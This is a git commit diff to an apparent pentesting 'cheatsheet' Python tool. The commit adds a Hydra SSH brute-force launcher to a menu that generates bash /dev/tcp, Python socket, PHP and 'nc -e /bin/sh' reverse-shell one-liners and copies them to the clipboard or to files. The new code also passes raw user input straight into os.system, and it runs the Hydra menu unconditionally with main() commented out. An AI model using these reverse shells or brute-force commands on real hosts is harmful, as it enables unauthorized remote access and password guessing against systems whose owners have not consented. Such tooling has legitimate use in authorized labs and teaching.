14f9eed1696b23761ba3bfdcb226c29d2387355a
Alexandre Antrieux <alexandre.antrieux@epitech.eu>
2022-08-24 17:39:55 +0200

    Add Bruteforce Hydra SSH (With uname)

--- cheatsheet.py
+++ cheatsheet.py
@@ -5,17 +5,26 @@ from ast import For
 from re import M
 import sys
 import os
+from tkinter import W
+from traceback import print_tb
 import pyperclip
 from time import sleep
 from colorama import Fore
 from colorama import Style
 from netifaces import interfaces, ifaddresses, AF_INET
 
-ipadd = "0.0.0.0" #Global variable for IP address
-port = "0000" #Global variable for port
-interf = "N/A" #Global variable for interface
+# Global variables for reverse shell
+ipadd = "0.0.0.0"  # Global variable for IP address
+port = "0000"  # Global variable for port
+interf = "N/A"  # Global variable for interface
 
-#Main function
+# Global variable for Hydra
+wordlist = ""  # Global variable for wordlist
+uname = ""  # Global variable for wordlist
+
+# Main function
+
+
 def main():
     banner = f"""{Style.BRIGHT}{Fore.MAGENTA}   ________               __  _____ __              __     __________________
   / ____/ /_  ___  ____ _/ /_/ ___// /_  ___  ___  / /_   / ____/_  __/ ____/
@@ -39,17 +48,19 @@ def main():
     print(f"{Fore.GREEN}[+] {Style.BRIGHT}{Fore.LIGHTBLUE_EX}Local IP {Fore.RESET}: " + ipadd + f"{Style.RESET_ALL}")
     print(f"{Fore.GREEN}[+] {Style.BRIGHT}{Fore.LIGHTBLUE_EX}Interface {Fore.RESET}: " + interf + f"{Style.RESET_ALL}")
     print("\n\n-------------")
-    choice = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter your choice : ')
-    match choice:                                                       #Match choice
-        case '1':                                                      #Create reverse shell
+    choice = input('\nEnter your choice : ')
+    match choice:  # Match choice
+        case '1':  # Create reverse shell
             revershell()
-        case '2':                                                     #Netcat connection
+        case '2':  # Netcat connection
             netcat()
-        case '3':                                                    #Set interface IP
+        case '3':  # Set interface IP
             setIp()
             backtomain()
 
-#Banner function
+# Banner function
+
+
 def banner():
     banner = f"""{Style.BRIGHT}{Fore.LIGHTYELLOW_EX}______                             _____ _          _ _
 | ___ \                           /  ___| |        | | |
@@ -62,22 +73,26 @@ def banner():
     print(banner)
 
 
-#Get IP of interface function
+# Get IP of interface function
 def getIp(interface):
     ipInt = ifaddresses(interface)[AF_INET][0]['addr']
     return ipInt
 
-def getInterfaces(): #Get interfaces function
-    #Loop through interfaces to get names and IPs
+
+def getInterfaces():  # Get interfaces function
+    # Loop through interfaces to get names and IPs
     x = 0
     for i in interfaces():
         x += 1
-        print(Fore.GREEN + "\n[+] " + Style.BRIGHT + Fore.LIGHTBLUE_EX + i + Style.RESET_ALL + Fore.RESET)
-        addresses = [i['addr'] for i in ifaddresses(i).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
-        print(' ' + Fore.GREEN +'└─> ' + Style.RESET_ALL + '(' + Style.BRIGHT +'\t'.join(addresses) + Style.RESET_ALL + ')')
+        print(Fore.GREEN + "\n[+] " + Style.BRIGHT +
+              Fore.LIGHTBLUE_EX + i + Style.RESET_ALL + Fore.RESET)
+        addresses = [i['addr'] for i in ifaddresses(
+            i).setdefault(AF_INET, [{'addr': 'No IP addr'}])]
+        print(' ' + Fore.GREEN + '└─> ' + Style.RESET_ALL +
+              '(' + Style.BRIGHT + '\t'.join(addresses) + Style.RESET_ALL + ')')
 
 
-#Set IP to global variable 'ipadd'
+# Set IP to global variable 'ipadd'
 def setIp():
     getInterfaces()
     interface = input(f'\n{Fore.YELLOW}[*]{Fore.RESET}{Style.BRIGHT} Enter the interface (lo,eth0,wlan0) :{Style.RESET_ALL} ')
@@ -85,32 +100,37 @@ def setIp():
     globals()['ipadd'] = getIp(interface)
     globals()['interf'] = interface
 
-def choice(shell, extention): #Choice for reverse shell
+
+def choice(shell, extention):  # Choice for reverse shell
     choice = input(
         f'\n{Fore.YELLOW}[*]{Fore.RESET} Do you want to {Fore.YELLOW}Copy{Fore.RESET} your shell to clipboard or export as {Fore.RED}File{Fore.RESET} ? ({Fore.YELLOW}c{Fore.RESET}/{Fore.RED}f{Fore.RESET}) : ')
-    match choice:                                                                   #Match choice
-        case 'c':                                                                   #Case C for copy to clipboard
-            pyperclip.copy(shell)                                                   #Copy reverse shell command to clipboard
+    match choice:  # Match choice
+        case 'c':  # Case C for copy to clipboard
+            pyperclip.copy(shell)  # Copy reverse shell command to clipboard
             print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is copied to Clipboard")
             sleep(1)
-            backtomain()                                                            #Go back to main menu
-        case 'f':                                                                   #Case F for export as file
-            file = "shell." + extention                                                       #Create file name
-            with open(file, "w") as f:                                              #Open file and write reverse shell command
-                f.write(shell)                                                      #Write reverse shell command to file
+            backtomain()  # Go back to main menu
+        case 'f':  # Case F for export as file
+            file = "shell." + extention  # Create file name
+            with open(file, "w") as f:  # Open file and write reverse shell command
+                f.write(shell)  # Write reverse shell command to file
             print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is exported as " + file)
             sleep(1)
             backtomain()
     return shell, extention
 
-#Go back to main menu function
+# Go back to main menu function
+
+
 def backtomain():
     print(f'\n{Fore.YELLOW}[*]{Fore.RESET} Go back to main')
     sleep(1)
     os.system('clear')
     main()
 
-#The main function for reverse shells
+# The main function for reverse shells
+
+
 def revershell():
     os.system('clear')
     banner()
@@ -122,46 +142,50 @@ def revershell():
 - [{Style.BRIGHT}6{Style.RESET_ALL}] {Style.BRIGHT}Exit {Style.RESET_ALL}
 """
     print(shells)
-    c_rs = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter your choice : ') #Choice for reverse shell
-    match c_rs:  #Match choice
-        case '1': #Bash reverse shell
+    c_rs = input('\nEnter your choice : ')  # Choice for reverse shell
+    match c_rs:  # Match choice
+        case '1':  # Bash reverse shell
             bash()
-        case '2': #Python reverse shell
+        case '2':  # Python reverse shell
             python()
-        case '3': #PHP reverse shell
+        case '3':  # PHP reverse shell
             php()
-        case '4': #Netcat reverse shell
+        case '4':  # Netcat reverse shell
             nc()
-        case '6': #Exit
+        case '6':  # Exit
             backtomain()
 
-#Bash reverse shell function
+# Bash reverse shell function
+
+
 def bash():
     os.system('clear')
     banner()
-    port1 = "1234"                                                                  #Setup default port for reverse shell
-    if ipadd == "0.0.0.0":                                                          #Check if IP address and Interface  is set
+    port1 = "1234"  # Setup default port for reverse shell
+    if ipadd == "0.0.0.0":  # Check if IP address and Interface  is set
         print(f"{Fore.RED}[!] {Fore.LIGHTRED_EX}You need to set your interface ip" + Fore.RESET)
         setIp()
-        bash()                                                                      #Callback bash function 
-    else:                                                                           #If IP address and Interface is set
+        bash()  # Callback bash function
+    else:  # If IP address and Interface is set
         port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
         if port == '':
-            port = port1                                                            #If no port is entered, use default port
+            port = port1  # If no port is entered, use default port
         else:
-            globals()['port'] = port                                                #If port is entered, set it to global variable
+            # If port is entered, set it to global variable
+            globals()['port'] = port
     print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is creating...")
     sleep(1)
-    shell = 'bash -i >& /dev/tcp/' + ipadd + '/' + port + ' 0>&1'                   #Create reverse shell command
+    shell = 'bash -i >& /dev/tcp/' + ipadd + '/' + \
+        port + ' 0>&1'  # Create reverse shell command
     print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
-    choice(shell, "sh")                                                             #Call choice function for reverse shell
+    choice(shell, "sh")  # Call choice function for reverse shell
 
 
-def python():                                                                       #Python reverse shell function
-    os.system('clear')                                                              #Its the same code as bash reverse shell function
+def python():  # Python reverse shell function
+    os.system('clear')  # Its the same code as bash reverse shell function
     banner()
     port1 = "1234"
-    if ipadd == "0.0.0.0":                                                         
+    if ipadd == "0.0.0.0":
         print(f"{Fore.RED}[!]{Fore.RESET} You need to set your interface ip")
         setIp()
         python()
@@ -178,11 +202,10 @@ def python():                                                                   
             '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
     print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
     choice(shell, "py")
-    
 
 
-def php():                                                                         #PHP reverse shell function
-    os.system('clear')                                                            #Its the same code as bash reverse shell function
+def php():  # PHP reverse shell function
+    os.system('clear')  # Its the same code as bash reverse shell function
     banner()
     port1 = "1234"
     if ipadd == "0.0.0.0":
@@ -203,8 +226,8 @@ def php():                                                                      
     choice(shell, "php")
 
 
-def nc():                                                                         #Netcat reverse shell function
-    os.system('clear')                                                           #Its the same code as bash reverse shell function
+def nc():  # Netcat reverse shell function
+    os.system('clear')  # Its the same code as bash reverse shell function
     banner()
     port1 = "1234"
     if ipadd == "0.0.0.0":
@@ -222,7 +245,6 @@ def nc():                                                                       
     shell = "nc -e /bin/sh " + ipadd + " " + port
     print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
     choice(shell, "sh")
-    
 
 
 def netcat():
@@ -236,6 +258,7 @@ def netcat():
 ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝  
 <------------------------------------------------------->"""
     print(banner)
+
 
 def hydra_banner():
     os.system('clear')
@@ -252,9 +275,94 @@ def hydra_banner():
 
 def hydra():
     hydra_banner()
+    print(f'- [{Style.BRIGHT}1{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}SSH{Fore.RESET}{Style.RESET_ALL}')
+    print(f'- [{Style.BRIGHT}2{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}FTP{Fore.RESET}{Style.RESET_ALL}')
+    print(f'- [{Style.BRIGHT}3{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}HTTP (POST-Form){Fore.RESET}{Style.RESET_ALL}')
+    print(f'- [{Style.BRIGHT}4{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}SQL{Fore.RESET}{Style.RESET_ALL}')
+    print(f'- [{Style.BRIGHT}5{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}SMTP (Enumerate Users){Fore.RESET}{Style.RESET_ALL}')
+    print(f'- [{Style.BRIGHT}9{Style.RESET_ALL}] {Style.BRIGHT}{Fore.MAGENTA}Back{Fore.RESET}{Style.RESET_ALL}')
 
+    choice = input('\nEnter your choice : ')
+    if choice == '1':
+        hydra_ssh()
+
+def hydra_check_wordlist(wdlist):
+    if os.path.exists(wdlist):
+        if wdlist == "":
+            wdlist = "/usr/share/wordlists/rockyou.txt"
+            globals()['wordlist'] = wdlist
+        else:
+            globals()['wordlist'] = wdlist
+    else:
+        print(f"{Fore.RED}[!]{Fore.RESET} Wordlist not found")
+        print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
+        sleep(1)
+        input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
+        hydra_ssh()
+    return wdlist
+
+
+def hydra_ssh():
+    os.system('clear')
+    hydra_banner()
+    choice = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Do you know the {Fore.MAGENTA}username{Fore.RESET},{Fore.CYAN}password{Fore.RESET} or {Fore.RED}nothing{Fore.RESET} ? ({Fore.MAGENTA}u{Fore.RESET}/{Fore.CYAN}p{Fore.RESET}/{Fore.RED}n{Fore.RESET}): ')
+    if choice == 'u':
+
+        #Input Section
+        uname = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.MAGENTA}username{Fore.RESET} : ')
+        wordlist = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the path of your {Fore.CYAN}wordlist{Fore.RESET} (Default: /usr/share/wordlists/rockyou.txt) : ')
+        ip = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.LIGHTGREEN_EX}ip{Fore.RESET} : ')
+        
+        #Checking Section
+        #Username Check
+        if uname == '':
+            print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.MAGENTA}username{Fore.RESET}")
+            print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
+            sleep(1)
+            input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
+            hydra_ssh()
+
+        #Wordlist Check
+        if wordlist == '':
+            wordlist = "/usr/share/wordlists/rockyou.txt"
+            if os.path.exists(wordlist):
+                globals()['wordlist'] = wordlist
+            else:
+                print(f"{Fore.RED}[!]{Fore.RESET} Wordlist not found")
+                print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
+                sleep(1)
+                input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
+                hydra_ssh()
+        else:
+            if os.path.exists(wordlist):
+                globals()['wordlist'] = wordlist
+            else:
+                print(f"{Fore.RED}[!]{Fore.RESET} Wordlist not found")
+                print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
+                sleep(1)
+                input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
+                hydra_ssh()
+
+        #IP Check
+        if ip == '':
+            print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.LIGHTGREEN_EX}username{Fore.RESET}")
+            print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
+            sleep(1)
+            input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
+            hydra_ssh()
+        else:
+            globals()['ip'] = ip
+        
+        print(uname  + " " + wordlist)
+        print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute starting...")
+        sleep(1)
+        hydra = "hydra -l " + uname + " -P " + wordlist + " " + ip + " -s 22 -t 1 ssh"
+        os.system(hydra)
+        print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute finished")
+        sleep(1)
+        input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
 
 hydra()
 
-if __name__ == "__main__":
-    main()                                                                       #Call main function to start the program
+# if __name__ == "__main__":
+#     main()                                                                       #Call main function to start the program
